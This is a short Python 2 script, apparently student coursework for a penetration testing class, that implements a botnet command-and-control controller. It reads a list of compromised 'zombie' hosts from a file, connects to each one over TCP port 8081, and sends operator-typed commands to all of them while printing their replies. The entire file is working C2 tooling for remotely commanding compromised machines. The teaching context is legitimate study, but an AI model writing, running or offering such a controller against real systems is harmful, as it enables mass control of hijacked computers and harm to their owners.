#!/usr/bin/python2

#Kyle Healy
#CPSC 62700 - Penetration Testing
#2/13/2019

# Python function interact with the botnet by sending basic commands to all zombie machines.

import socket

def connectToBots(botsFilename):
    hosts = readInHostsFromFile(botsFilename)
    allsocks=[]
    for host in hosts:
        try:
            #Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            #Connect socket to the host at specified port
            server_address = (host, 8081)
            sock.connect(server_address)
            allsocks.append((host,sock))
        except:
            print "Issue connecting to", host
    print "Connected to all bots"
    return allsocks

def readInHostsFromFile(botsFilename):
    hosts=[]
    with open(botsFilename, 'r') as f:
        for line in f:
            hosts.append(line.strip())
    return hosts

def runCommandsOnZombies(allsocks):
    exitProg = False
    cmd = raw_input("Enter command string:\n")
    for (host, sock) in allsocks:
        try:
            sock.sendall(cmd)
            response = sock.recv(1024)
            if cmd=="exit":
                exitProg = True
                print "Disconnected"
            print "Response from", host
            print response

        except:
            print "Failed to send", cmd, "to host", host
    return exitProg

# Main program to run the candc.py code.
if __name__ == "__main__":
    print "Starting candc.py"
    bottedHostsFilename = "botted_hosts.txt"
    allsocks = connectToBots(bottedHostsFilename)
    exitProg = False
    while not exitProg:
        exitProg = runCommandsOnZombies(allsocks)
    print "Exiting candc.py"

